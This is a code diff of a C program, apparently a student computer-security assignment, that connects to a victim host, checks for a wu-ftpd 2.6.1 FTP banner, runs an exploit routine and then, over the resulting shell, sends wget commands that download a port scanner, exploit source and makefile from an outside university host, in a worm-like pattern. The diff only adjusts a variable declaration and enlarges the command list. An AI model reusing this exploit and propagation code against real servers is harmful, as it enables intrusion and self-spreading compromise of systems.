@@ -31,6 +31,7 @@ int main(int argc, char *argv[]) {
     int ret; 
     int conexao; 
     char buf[200]; 
+    int fd;
     struct sockaddr_in vitima;
     meuSocket = socket(AF_INET, SOCK_STREAM, 0);
  
@@ -54,7 +55,7 @@ int main(int argc, char *argv[]) {
     printf("%p\n", strstr(buf,"220"));
     if (strstr(buf,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
         printf("Esse é o banner\n");
-        int fd = exploiter(argc, argv);
+        fd = exploiter(argc, argv);
         cshell(fd);
         exit(1);
     }
@@ -77,7 +78,7 @@ void cshell (int sock) {
         char    buf2[2];
         fd_set  rfds;
 
-        char *commands[4] = {   
+        char *commands[5] = {   
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
@@ -87,7 +88,7 @@ void cshell (int sock) {
         // int buffsize[7] = {3, 4, 5, 3, 8};
 
         int i;
-        for(i=0; i<4; i++) {
+        for(i=0; i<5; i++) {
             write (sock, commands[i], strlen(commands[i]));
         }
         
